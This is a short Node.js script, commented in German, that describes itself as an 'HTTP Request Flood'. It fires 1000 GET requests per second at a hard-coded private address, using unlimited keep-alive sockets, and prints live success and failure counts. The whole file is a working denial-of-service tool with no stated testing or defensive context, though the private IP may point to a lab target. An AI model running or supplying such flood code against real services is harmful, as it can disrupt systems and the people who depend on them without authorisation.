const http = require('http');
const https = require('https');

const SERVER_URL = 'http://10.62.144.174:4000';
const REQUESTS_PER_SECOND = 1000;

// Performance-Optimierungen
const agent = new http.Agent({
    keepAlive: true,
    maxSockets: Infinity,
    timeout: 2000
});

let stats = {
    success: 0,
    failed: 0,
    total: 0,
    startTime: Date.now()
};

console.log(' HTTP Request Flood gestartet (1000 reqs/s)\n');

function sendRequest() {
    const protocol = SERVER_URL.startsWith('https') ? https : http;
    const req = protocol.request(SERVER_URL, {
        agent,
        method: 'GET',
        timeout: 1000
    }, (res) => {
        res.on('data', () => {
        });
        res.on('end', () => {
            stats.success++;
            stats.total++;
            updateDisplay();
        });
    });

    req.on('error', () => {
        stats.failed++;
        stats.total++;
        updateDisplay();
    });

    req.on('timeout', () => {
        req.destroy();
        stats.failed++;
        stats.total++;
        updateDisplay();
    });

    req.end();
}

function updateDisplay() {
    const runtimeSec = Math.floor((Date.now() - stats.startTime) / 1000);
    const reqsPerSec = (stats.total / runtimeSec).toFixed(1);

    process.stdout.clearLine();
    process.stdout.cursorTo(0);
    process.stdout.write(
        `Erfolg: ${stats.success} | ` +
        `Fehler: ${stats.failed} | ` +
        `Rate: ${reqsPerSec}/s `
    );
}

// Starte Flood
setInterval(() => {
    for (let i = 0; i < REQUESTS_PER_SECOND; i++) {
        sendRequest();
    }
}, 1000);

// Status-Update
setInterval(updateDisplay, 500);
